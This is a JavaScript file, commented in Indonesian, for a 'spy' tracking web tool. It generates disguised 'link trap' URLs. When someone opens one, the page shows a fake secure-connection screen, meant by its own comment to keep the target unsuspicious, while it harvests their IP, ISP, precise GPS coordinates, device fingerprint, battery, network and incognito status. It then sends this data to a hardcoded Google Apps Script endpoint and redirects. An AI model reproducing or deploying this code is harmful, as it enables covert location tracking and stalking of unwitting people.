document.addEventListener('DOMContentLoaded', function () {
    const myIpBadge = document.getElementById('my-ip-badge');
    const loading = document.getElementById('loading');
    const resultArea = document.getElementById('result-area');
    const geoResult = document.getElementById('geo-result');
    const geoData = document.getElementById('geo-data');
    const logsBody = document.getElementById('logs-body');
    const btnGeolocation = document.getElementById('btn-geolocation');

    // Default Google Apps Script Web App URL untuk penyimpanan spreadsheet
    const DEFAULT_CLOUD_URL = 'https://script.google.com/macros/s/AKfycbybsV2mGiO8JfXaD9DjkGBbk2Fy2rR37ZAdNaoq9IsqFFQX08zGZvXdnWUGSzDun49huQ/exec';

    /**
     * Mendapatkan URL API yang aktif.
     * Prioritas: 1. LocalStorage (User Settings), 2. Default Cloud URL.
     */
    const getCUrl = () => localStorage.getItem('spy_cloud_url') || DEFAULT_CLOUD_URL;

    /**
     * Mengambil jejak digital perangkat (Device Fingerprinting).
     */
    const getDeviceInfo = () => {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const screen = `${window.screen.width}x${window.screen.height}`;
        const lang = navigator.language;
        
        let os = "Unknown OS";
        if (/Windows/i.test(ua)) os = "Windows";
        else if (/Android/i.test(ua)) os = "Android";
        else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
        else if (/Mac/i.test(ua)) os = "MacOS";
        else if (/Linux/i.test(ua)) os = "Linux";

        let browser = "Unknown Browser";
        if (/Edg/i.test(ua)) browser = "Edge";
        else if (/Chrome/i.test(ua)) browser = "Chrome";
        else if (/Firefox/i.test(ua)) browser = "Firefox";
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";

        return { os, browser, screen, lang, platform, ua };
    };

    /**
     * Mengambil status baterai perangkat.
     */
    const getBatteryInfo = async () => {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Charging' : 'Discharging'
                };
            } catch (e) { return { level: 'N/A', charging: 'N/A' }; }
        }
        return { level: 'Not Supported', charging: 'Not Supported' };
    };

    /**
     * Mendeteksi apakah user menggunakan mode Incognito/Private.
     */
    const getIncognitoStatus = async () => {
        try {
            if (navigator.storage && navigator.storage.estimate) {
                const { quota } = await navigator.storage.estimate();
                if (quota < 120000000) return 'YES'; // Limit kuota biasanya sangat rendah di mode Private
            }
        } catch (e) {}
        return 'NO';
    };

    /**
     * Mengambil informasi jaringan (WiFi/Seluler).
     */
    const getNetworkInfo = () => {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return {
                type: conn.type || 'unknown', // wifi, cellular, etc.
                speed: conn.effectiveType || 'unknown' // 4g, 3g, etc.
            };
        }
        return { type: 'Not Supported', speed: 'N/A' };
    };

    /**
     * Memberikan notifikasi suara menggunakan Web Speech API.
     */
    const speak = (text) => {
        if ('speechSynthesis' in window) {
            const utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = 'en-US';
            utterance.rate = 0.9; // Sedikit lebih lambat agar terdengar dramatis
            window.speechSynthesis.speak(utterance);
        }
    };

    function showLoading(show) {
        if (show) loading.classList.remove('d-none');
        else loading.classList.add('d-none');
    }

    async function detectMyIp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            myIpBadge.innerHTML = `<i class="fas fa-shield-alt me-2 text-primary"></i><span class="font-monospace">${data.ip}</span>`;
            return data.ip;
        } catch (err) {
            myIpBadge.innerHTML = `<i class="fas fa-exclamation-triangle me-2 text-warning"></i>Offline / Blocked`;
            return null;
        }
    }
    detectMyIp();

    async function fetchIpIntel(ip = '') {
        const query = ip ? `/${ip}` : '';
        try {
            // Menggunakan ipwho.is untuk deteksi VPN/Proxy gratis
            const res = await fetch(`https://ipwho.is${query}`);
            const data = await res.json();
            if (data.success) return {
                ip: data.ip, 
                isp: data.connection.isp, 
                location: `${data.city}, ${data.country}`,
                lat: data.latitude, 
                lon: data.longitude, 
                timezone: data.timezone.id,
                proxy: (data.security.proxy || data.security.vpn || data.security.tor) ? 'YES' : 'NO'
            };
        } catch (e) {}

        try {
            const res = await fetch(`https://get.geojs.io/v1/ip/geo${query}.json`);
            const data = await res.json();
            return {
                ip: data.ip, isp: data.organization, location: `${data.city}, ${data.country}`,
                lat: data.latitude, lon: data.longitude, timezone: data.timezone,
                proxy: 'Unknown'
            };
        } catch (e) {}
        throw new Error("Gagal menghubungi server intelijen.");
    }

    async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
        const cloudUrl = getCUrl();

        // Ambil semua intelijen perangkat secara asinkron
        const [device, battery, incognito] = await Promise.all([
            getDeviceInfo(),
            getBatteryInfo(),
            getIncognitoStatus()
        ]);
        const network = getNetworkInfo();

        // Payload untuk dikirim ke Google Apps Script
        const logEntry = {
            timestamp: new Date().toISOString(),
            type: type,
            ip: data.ip || 'Unknown',
            isp: data.isp || 'Unknown',
            location: data.location || 'Unknown',
            coords: `${data.lat || 0}, ${data.lon || 0}`,
            timezone: data.timezone || 'N/A',
            os: device.os || 'Unknown OS',
            browser: device.browser || 'Unknown Browser',
            resolution: device.screen || 'N/A',
            language: device.lang || 'N/A',
            platform: device.platform || 'N/A',
            target: targetUrl,
            userAgent: navigator.userAgent,
            batteryLevel: battery.level,
            batteryStatus: battery.charging,
            networkType: network.type,
            networkSpeed: network.speed,
            isProxy: data.proxy || 'NO',
            isIncognito: incognito || 'NO',
            device: `${device.os} (${device.browser}) | ${device.screen}`
        };

        if (!cloudUrl || !cloudUrl.includes('script.google.com')) {
            console.error("Target URL tidak valid. Menghentikan sinkronisasi cloud untuk mencegah Error 405.");
            return;
        }

        // Save Local backup
        const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
        localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
        localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));

        try {
            const response = await fetch(`${cloudUrl}?action=save`, {
                method: 'POST',
                headers: { 'Content-Type': 'text/plain' },
                body: JSON.stringify(logEntry),
                mode: 'cors'
            });

            if (!response.ok) {
                throw new Error(`Cloud sync gagal: ${response.status}`);
            }

            const result = await response.json();
            if (!result.success) {
                throw new Error(result.error || 'Unknown cloud error');
            }

            console.log('Tracking sync completed.', result.message);
            speak('Target Acquired. Data synchronized to cloud.');
        } catch (e) {
            console.error('Cloud Error', e);
        }
    }

    async function loadLogs() {
        const cloudUrl = getCUrl();
        logsBody.innerHTML = '<tr><td colspan="6" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Menghubungkan ke Satelit...</td></tr>';
        try {
            const res = await fetch(`${cloudUrl}?action=logs`, { mode: 'cors' });
            const data = await res.json();
            if (data.success && Array.isArray(data.logs)) {
                renderLogs(data.logs);
                return;
            }
            throw new Error('Response log tidak valid');
        } catch (e) {
            console.warn('Cloud log fetch gagal, menampilkan cache lokal.', e);
            renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'), true);
        }
    }

    function renderLogs(logs) {
        if (!logs || logs.length === 0) {
            logsBody.innerHTML = '<tr><td colspan="6" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas.</td></tr>';
            return;
        }
        logsBody.innerHTML = logs.map(log => {
            const isTrap = log.type === 'TRAP';
            const isVpn = log.isProxy === 'YES';
            const isInc = log.isIncognito === 'YES';
            const deviceDisplay = log.device || (log.os ? `${log.os} (${log.browser})` : 'N/A');
            return `
                <tr class="animate__animated animate__fadeIn">
                    <td><div class="text-primary small fw-bold">${log.timestamp || 'Just Now'}</div><span class="badge ${isTrap ? 'bg-danger' : 'bg-primary'} extra-small" style="font-size:0.6rem">${isTrap ? 'LINK TRAP' : 'LIVE TRACK'}</span></td>
                    <td>
                        <div class="font-monospace text-info fw-bold">${log.ip} ${isVpn ? '<i class="fas fa-user-mask text-danger ms-1" title="VPN DETECTED"></i>' : ''}</div>
                        <div class="text-muted extra-small"><i class="fas fa-network-wired me-1"></i>${log.isp || 'Unknown Provider'}</div>
                    </td>
                    <td>
                        ${isVpn ? '<span class="badge bg-danger extra-small d-block mb-1">VPN</span>' : '<span class="badge bg-success opacity-50 extra-small d-block mb-1">CLEAN</span>'}
                        ${isInc ? '<span class="badge bg-warning text-dark extra-small d-block">PRIVATE</span>' : ''}
                    </td>
                    <td>
                        <div class="text-warning extra-small font-monospace"><i class="fas fa-microchip me-1"></i>${deviceDisplay}</div>
                    </td>
                    <td><span class="small text-white">${log.location}</span></td>
                    <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
                </tr>`;
        }).join('');
    }

    async function performTrack(targetIp) {
        showLoading(true);
        resultArea.innerHTML = '';
        try {
            const data = await fetchIpIntel(targetIp);
            
            showLoading(false);
            const d = getDeviceInfo();
            const b = await getBatteryInfo();
            const i = await getIncognitoStatus();
            const n = getNetworkInfo();
            const proxyIcon = data.proxy === 'YES' ? '<i class="fas fa-user-mask text-danger"></i>' : '<i class="fas fa-check-circle text-success"></i>';

            resultArea.innerHTML = `
                <div class="result-card border-primary border-opacity-25 scanning-container animate__animated animate__fadeInUp">
                    <div class="scanning-line"></div>
                    <h5 class="fw-bold text-primary mb-3"><i class="fas fa-fingerprint me-2"></i>Intel: <span class="font-monospace">${data.ip}</span></h5>
                    <div class="mb-1">
                        <div class="data-label">Lokasi Terdeteksi</div>
                        <div class="scanning-text small">${data.location}</div>
                    </div>
                    <div class="mb-3">
                        <div class="data-label">Provider (ISP)</div>
                        <div class="scanning-text small font-monospace">${data.isp}</div>
                    </div>
                    <div class="mb-3">
                        <div class="data-label">VPN/Proxy Detection</div>
                        <div class="text-white small">${proxyIcon} ${data.proxy === 'YES' ? 'Detected (High Risk)' : 'Clean (Low Risk)'}</div>
                    </div>
                    <div class="mb-3">
                        <div class="data-label">Private Browsing</div>
                        <div class="text-white small">${i === 'YES' ? '<i class="fas fa-eye-slash text-warning me-2"></i>Incognito Mode Detected' : '<i class="fas fa-eye text-success me-2"></i>Normal Mode'}</div>
                    </div>
                    <div class="mb-3">
                        <div class="data-label">Perangkat & OS</div>
                        <div class="scanning-text small"><i class="fas fa-desktop me-2 text-info"></i>${d.os} (${d.browser}) | ${d.screen} | <i class="fas fa-battery-half me-1"></i>${b.level} | <i class="fas fa-network-wired me-1"></i>${n.type}</div>
                    </div>
                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link w-100 text-center py-2">BUKA PETA</a>
                </div>`;
            await saveLog(data, targetIp ? 'MANUAL' : 'LIVE');
        } catch (e) { showLoading(false); alert(e.message); }
    }

    btnGeolocation.addEventListener('click', () => {
        if (!navigator.geolocation) {
            alert("Perangkat atau browser Anda tidak mendukung fitur GPS Geolocation.");
            return;
        }

        showLoading(true);
        resultArea.innerHTML = '';
        geoResult.classList.add('d-none');

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                try {
                    const { latitude, longitude, accuracy } = position.coords;
                    
                    // Mengumpulkan Intelijen IP & Perangkat secara paralel untuk efisiensi
                    const [ipData, battery, incognito] = await Promise.all([
                        fetchIpIntel('').catch(() => ({ ip: 'Unknown', isp: 'Unknown', location: 'Unknown', proxy: 'NO', timezone: 'N/A' })),
                        getBatteryInfo(),
                        getIncognitoStatus()
                    ]);

                    showLoading(false);
                    const device = getDeviceInfo();
                    const network = getNetworkInfo();

                    // Gabungkan data GPS dengan data IP
                    const combinedIntel = {
                        ...ipData,
                        lat: latitude,
                        lon: longitude,
                        location: `${ipData.location} (High Precision GPS ±${accuracy.toFixed(0)}m)`
                    };

                    // Tampilkan Hasil Lengkap di UI
                    const proxyIcon = combinedIntel.proxy === 'YES' ? '<i class="fas fa-user-mask text-danger"></i>' : '<i class="fas fa-check-circle text-success"></i>';
                    resultArea.innerHTML = `
                        <div class="result-card border-info scanning-container animate__animated animate__fadeInUp">
                            <div class="scanning-line"></div>
                            <h5 class="fw-bold text-info mb-3"><i class="fas fa-satellite-dish me-2"></i>Intelijen GPS Gabungan: ${combinedIntel.ip}</h5>
                            <div class="mb-2"><div class="data-label">Lokasi Presisi</div><div class="scanning-text small">${combinedIntel.location}</div></div>
                            <div class="mb-2"><div class="data-label">Koordinat</div><div class="scanning-text small font-monospace">${latitude}, ${longitude}</div></div>
                            <div class="mb-2"><div class="data-label">Provider (ISP)</div><div class="scanning-text small font-monospace">${combinedIntel.isp}</div></div>
                            <div class="mb-2"><div class="data-label">Keamanan & Mode</div><div class="scanning-text small">${proxyIcon} VPN: ${combinedIntel.proxy} | <i class="fas fa-eye${incognito === 'YES' ? '-slash text-warning' : ' text-success'} ms-2"></i> Private: ${incognito}</div></div>
                            <div class="mb-3"><div class="data-label">Perangkat & Daya</div><div class="scanning-text small">${device.os} (${device.browser}) | ${device.screen} | <i class="fas fa-battery-half me-1"></i>${battery.level} | <i class="fas fa-network-wired me-1"></i>${network.type}</div></div>
                            <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="map-link w-100 text-center py-2">BUKA PETA STRATEGIS</a>
                        </div>`;

                    // Kirim semua data ke Spreadsheet
                    await saveLog(combinedIntel, 'GPS');
                } catch (e) {
                    showLoading(false);
                    alert("Gagal sinkronisasi intelijen: " + e.message);
                }
            },
            (error) => {
                showLoading(false);
                const msgs = { 1: 'Izin GPS ditolak.', 2: 'Posisi tidak ditemukan.', 3: 'Waktu permintaan habis.' };
                alert(`Error Geolocation: ${msgs[error.code] || error.message}`);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });

    document.getElementById('btn-track-ip').addEventListener('click', () => performTrack(document.getElementById('ip-to-track').value));
    document.getElementById('btn-track-me').addEventListener('click', () => performTrack(''));
    document.getElementById('logs-tab').addEventListener('click', loadLogs);
    document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
    document.getElementById('btn-clear-logs').addEventListener('click', () => { if(confirm('Hapus log?')) { localStorage.removeItem('spy_logs'); loadLogs(); }});

    // Link Generator
    const btnGenerate = document.getElementById('btn-generate-link');
    const spyUrlResult = document.getElementById('spy-url-result');
    const generatedResult = document.getElementById('generated-result');

    btnGenerate.addEventListener('click', () => {
        const targetUrl = document.getElementById('target-url').value.trim();
        if (!targetUrl.startsWith('http')) return alert('URL harus diawali http:// atau https://');
        const currentUrl = window.location.href.split('?')[0];
        spyUrlResult.value = `${currentUrl}?id=${Math.random().toString(36).substring(7)}&redir=${encodeURIComponent(targetUrl)}`;
        generatedResult.classList.remove('d-none');
    });

    document.getElementById('btn-copy-link').addEventListener('click', async function() {
        await navigator.clipboard.writeText(spyUrlResult.value);
        this.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => this.innerHTML = '<i class="fas fa-copy"></i>', 2000);
    });

    // Handle Trap Redirect
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('id') && urlParams.has('redir')) {
        const redirTarget = urlParams.get('redir');
        
        // Sembunyikan UI utama dan tampilkan layar pemrosesan agar target tidak curiga
        document.body.innerHTML = `
            <div class="d-flex justify-content-center align-items-center vh-100 bg-dark text-white text-center">
                <div>
                    <div class="spinner-grow text-primary mb-3" style="width: 3rem; height: 3rem;"></div>
                    <p class="fw-bold tracking-text">REDIRECTING TO SECURE TARGET...</p>
                    <p class="text-muted small">Please wait while we verify your secure connection...</p>
                </div>
            </div>`;

        const runTrap = async () => {
            let trackerData = { ip: 'Unknown', isp: 'Unknown', location: 'Unknown', lat: 0, lon: 0, device: getDeviceInfo() };
            
            // 1. Tahap Pertama: Ambil data Intelijen IP (Cepat)
            try {
                trackerData = await fetchIpIntel('');
            } catch (e) { console.error("Initial IP tracking failed"); }

            // 2. Tahap Kedua: Ambil Koordinat GPS Realtime (Meminta Izin Browser)
            if (navigator.geolocation) {
                const getGPS = new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve(pos.coords),
                        () => resolve(null), // Jika ditolak atau error, kembalikan null
                        { enableHighAccuracy: true, timeout: 6000 }
                    );
                });

                const coords = await getGPS;
                if (coords) {
                    trackerData.lat = coords.latitude;
                    trackerData.lon = coords.longitude;
                    trackerData.location = `${trackerData.location} (High Accuracy GPS)`;
                }
            }

            // 3. Tahap Ketiga: Sinkronisasi Data ke Cloud & Redirect
            await saveLog(trackerData, 'TRAP', redirTarget);
            window.location.replace(redirTarget);
        };

        runTrap();
    }
});
